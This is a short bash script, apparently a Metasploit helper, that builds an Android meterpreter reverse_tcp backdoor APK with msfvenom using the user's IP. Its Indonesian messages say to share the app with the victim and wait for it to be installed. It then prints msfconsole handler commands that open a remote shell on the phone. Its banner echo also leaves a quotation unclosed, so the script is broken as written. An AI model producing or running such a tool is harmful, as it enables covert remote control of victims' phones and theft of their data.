#!/bin/bash


echo "
METASPLOIT              _
/ ___|| |__   ___  _ __| |_
\___ \| '_ \ / _ \| '__| __|
 ___) | | | | (_) | |  | |_
|____/|_| |_|\___/|_|   \__|
                    VERSION
''''''''''''''''''''''''''''
By SAM$


read -p "your IP: " ip
read -p "your back door name: " nm
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=8080 -o /sdcard/$nm.apk

echo "[•] apk berhasil dibuat, cek dipenyimpanan internal
[•] bagikan aplikasi ke korban
[•] jika sudah dipasang ketik y
" | lolcat

read -p "continue? [Y/n]: " y

if [ $y = y ] || [ $y = Y ]
then
echo "
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost $ip
set lport 8080
run"

echo "ketikan ini" | lolcat
fi

